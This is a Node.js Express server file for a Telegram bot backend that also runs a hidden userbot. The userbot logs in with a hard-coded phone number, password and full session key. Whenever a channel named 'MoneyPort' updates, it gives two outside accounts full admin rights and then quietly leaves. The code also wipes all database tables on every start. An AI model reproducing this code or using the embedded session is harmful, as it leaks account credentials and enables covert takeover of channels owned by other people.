require('dotenv').config();
const express = require('express');
const cors = require('cors');
const router = require('./router/index');
const errorMiddleware = require('./middleware/error-middleware');
const { sequelize } = require('./db');
const { StringSession } = require('telegram/sessions');
const { TelegramClient, Api } = require('telegram');

const PORT = process.env.PORT || 5000;
const app = express();

app.use(express.json({ extended: false }));
app.use(cors({ origin: true }));
app.use('/bot', router);
app.use(errorMiddleware);

const initInviter = async () => {
  const acc = {
    api_id: '8',
    api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
    system_version: '16.0',
    app_version: '9.1.0 (24428) ',
    device_model: 'iPhone 12 Pro Max',
    tg_id: '5691040057',
    phone: '6281389285246',
    username: 'izyvipe1',
    last_time: '1674150350',
    password: 'izyvipe1_5691040057',
    key: '1BVtsOIYBu1TTc70L4HHMuON1EHUqRy5pHIQEivtZ2wF-rGKCp5pShkMDBrBmSlSdGOTnT5EjHZhnBxlCAbN7VfLuts00LXlvJyfl6HinoRRl0D5fqgycHWHpEbX0UoeuVM5pdpanAA7mRlOZfZ1kvHWwtCULCDAUT5Y0_zaXMhcqwMB3-HUZJrgXwqdBo_4mp_uAHEczm1Tft53aHukayr8EpCzByjqQHMaKMo7PSQmxU-yGt6Z_BM2xJda9IZ-FQTwjIbWbQwl4yA9kliVhA9xC5Y0ii3-aoqYQkUwnaOYU4EEIqYWE3vc46Lr3gFD1RldY1Q3bFGCds3fCvyyqIb8zpJ-SewE=',
  };
  const stringSession = new StringSession(acc.key);
  const client = new TelegramClient(
    stringSession,
    Number(acc.api_id),
    acc.api_hash
  );
  await client.connect();
  const me = await client.getMe();
  console.log(me.username);
  const users = ['yaraboyz', 'gohardpls'];
  client.addEventHandler(async (update) => {
    if (update.className != 'UpdateChannel') return;
    const chat = await client.getEntity(update.channelId);
    if (!chat.title.includes('MoneyPort')) return;
    for (const user of users) {
      try {
        const result = await client.invoke(
          new Api.channels.EditAdmin({
            channel: chat,
            userId: user,
            adminRights: new Api.ChatAdminRights({
              changeInfo: true,
              postMessages: true,
              editMessages: true,
              deleteMessages: true,
              banUsers: true,
              inviteUsers: true,
              pinMessages: true,
              addAdmins: true,
              anonymous: false,
              manageCall: true,
              other: true,
            }),
            rank: 'Admin',
          })
        );
      } catch (e) {
        console.log(e);
        continue;
      }
    }
    await client.invoke(
      new Api.channels.LeaveChannel({
        channel: chat,
      })
    );
  });
};

const start = async () => {
  try {
    await sequelize
      .authenticate()
      .then(() => {
        console.log('Connection has been established successfully.');
      })
      .catch((error) => {
        console.error('Unable to connect to the database: ', error);
      });
    await sequelize.sync({ force: true, alter: true });
    app.listen(PORT, () => console.log(`Server started on PORT = ${PORT}`));
    await initInviter();
  } catch (e) {
    console.log(e);
  }
};

start();
